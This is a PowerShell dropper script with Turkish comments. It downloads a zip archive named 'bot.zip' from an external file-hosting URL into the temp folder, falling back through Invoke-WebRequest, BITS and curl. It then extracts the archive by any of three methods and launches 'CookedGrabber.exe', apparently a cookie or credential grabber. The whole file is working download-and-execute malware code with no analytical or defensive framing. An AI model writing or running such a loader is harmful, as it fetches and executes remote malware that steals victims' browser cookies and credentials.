$zipUrl = "https://phs8.krakencloud.net/force-download/YTVlZDUyNmFjMjM0ODljMEdJkIYYNXKlh90AQUmTDQePnkgZwCY0DknElozHjF3N/nhRWBTtepD"
$zipPath = "$env:TEMP\bot.zip"
$extractPath = "$env:TEMP\cikartilan"
$exeName = "CookedGrabber.exe"

# Eski kalıntıları temizle
Remove-Item $zipPath -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue

function Try-ExtractZip {
    param ($path)

    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $path)
        return $true
    } catch {
        return $false
    }
}

function Try-Extract7Zip {
    param ($path)
    $sevenZip = "C:\Program Files\7-Zip\7z.exe"
    if (Test-Path $sevenZip) {
        try {
            Start-Process -FilePath $sevenZip -ArgumentList "x `"$zipPath`" -o`"$path`" -y" -Wait
            return $true
        } catch {
            return $false
        }
    }
    return $false
}

function Try-ExtractShellApp {
    param ($path)
    try {
        $shell = New-Object -ComObject shell.application
        $zip = $shell.NameSpace($zipPath)
        $dest = $shell.NameSpace($path)
        $dest.CopyHere($zip.Items(), 16)
        Start-Sleep -Seconds 3
        return $true
    } catch {
        return $false
    }
}

function Try-Download {
    try {
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
        return (Test-Path $zipPath)
    } catch {
        try {
            Start-BitsTransfer -Source $zipUrl -Destination $zipPath
            return (Test-Path $zipPath)
        } catch {
            try {
                curl.exe -L $zipUrl -o $zipPath
                return (Test-Path $zipPath)
            } catch {
                return $false
            }
        }
    }
}

function Try-RunExe {
    param ($folder, $exe)
    $exePath = Join-Path $folder $exe
    if (Test-Path $exePath) {
        Start-Process -FilePath $exePath
        return $true
    }
    return $false
}

# 🔥 BAŞLAAAAAA
if (Try-Download) {
    if (!(Test-Path $extractPath)) {
        New-Item -ItemType Directory -Path $extractPath | Out-Null
    }

    $extracted = $false

    $methods = @("Try-ExtractZip", "Try-Extract7Zip", "Try-ExtractShellApp")

    foreach ($method in $methods) {
        Write-Host "Deniyor: $method"
        if (& $method $extractPath) {
            $extracted = $true
            break
        }
    }

    if ($extracted) {
        if (!(Try-RunExe $extractPath $exeName)) {
            Write-Host "EXE bulunamadı veya çalışmadı. 💔"
        }
    } else {
        Write-Host "Hiçbir çıkarma yöntemi işe yaramadı. ZIP BOK GİBİ. 💀"
    }
} else {
    Write-Host "İndirme başarısız. 🙃"
}
